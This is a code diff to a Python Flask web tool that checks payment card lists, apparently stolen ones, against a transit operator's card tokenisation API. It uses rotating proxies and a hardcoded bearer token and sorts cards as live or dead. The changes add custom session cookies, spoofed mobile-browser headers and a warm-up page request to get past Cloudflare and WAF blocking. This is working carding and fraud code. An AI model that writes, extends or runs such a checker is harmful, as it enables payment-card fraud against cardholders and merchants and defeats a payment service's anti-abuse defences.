@@ -268,7 +268,7 @@ def test_proxy(proxy_dict):
     except Exception:
         return False
 
-def check_single_card(card_line, proxy_pool):
+def check_single_card(card_line, proxy_pool, custom_cookies=""):
     parts = card_line.split("|")
     if len(parts) < 3:
         return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
@@ -282,12 +282,37 @@ def check_single_card(card_line, proxy_pool):
     session.trust_env = False
     p_dict = proxy_pool.next() if proxy_pool else None
 
+    if custom_cookies:
+        for c in custom_cookies.split(";"):
+            if "=" in c:
+                k, v = c.split("=", 1)
+                session.cookies.set(k.strip(), v.strip(), domain=".littlepay.com")
+
+    headers = {
+        "Authorization": f"Bearer {INLINE_BEARER_TOKEN}",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://coastrta.littlepay.com",
+        "Referer": "https://coastrta.littlepay.com/",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "cross-site",
+        "Connection": "keep-alive"
+    }
+
     try:
+        if not custom_cookies:
+            try:
+                session.get("https://coastrta.littlepay.com/en/coast-rta/trip-history", headers={**headers, "Accept": "text/html"}, proxies=p_dict, timeout=8, verify=False)
+            except Exception:
+                pass
+
         r = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
-                        headers={"Authorization": f"Bearer {INLINE_BEARER_TOKEN}", "User-Agent": UA}, 
+                        headers=headers, 
                         proxies=p_dict, timeout=10, verify=False)
         if r.status_code != 200:
-            return 2, "ERROR", f"HTTP {r.status_code} (Token/Proxy issue)"
+            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
         
         keys = r.json().get("list", [])
         if not keys:
@@ -312,8 +337,11 @@ def check_single_card(card_line, proxy_pool):
         else:
             return 2, "ERROR", "Missing python-jose dependency"
 
+        auth_headers = headers.copy()
+        auth_headers["Content-Type"] = "application/json"
+
         r2 = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
-                          headers={"Authorization": f"Bearer {INLINE_BEARER_TOKEN}", "Content-Type": "application/json", "User-Agent": UA},
+                          headers=auth_headers,
                           json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False},
                           proxies=p_dict, timeout=10, verify=False)
         
@@ -331,7 +359,7 @@ def check_single_card(card_line, proxy_pool):
             return 1, "DEAD", "CARD_DECLINED"
 
         r3 = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
-                       headers={"Authorization": f"Bearer {INLINE_BEARER_TOKEN}", "User-Agent": UA},
+                       headers=headers,
                        proxies=p_dict, timeout=10, verify=False)
         
         try:
@@ -352,7 +380,7 @@ def check_single_card(card_line, proxy_pool):
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
         return 2, "ERROR", err_msg or "Exception"
 
-def background_worker(cards, proxies_list):
+def background_worker(cards, proxies_list, cookies_str=""):
     raw_pool = WebProxyPool(proxies_list)
     valid_proxies = []
     total_proxies = len(raw_pool.proxies)
@@ -393,7 +421,7 @@ def background_worker(cards, proxies_list):
             counts["error"] += 1
             continue
 
-        code, status, detail = check_single_card(card, proxy_pool)
+        code, status, detail = check_single_card(card, proxy_pool, cookies_str)
         counts["checked"] += 1
         if code == 0: counts["live"] += 1
         elif code == 1: counts["dead"] += 1
@@ -422,11 +450,12 @@ def api_checker_start():
     data = request.get_json() or {}
     cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
     proxies = [line.strip() for line in data.get('proxies', '').split('\n') if line.strip()]
+    cookies = data.get('cookies', '').strip()
 
     if not cards:
         return jsonify({"success": False, "message": "No cards provided"}), 400
 
-    threading.Thread(target=background_worker, args=(cards, proxies), daemon=True).start()
+    threading.Thread(target=background_worker, args=(cards, proxies, cookies), daemon=True).start()
     return jsonify({"success": True})
 
 @app.route('/api/checker/stop', methods=['POST'])
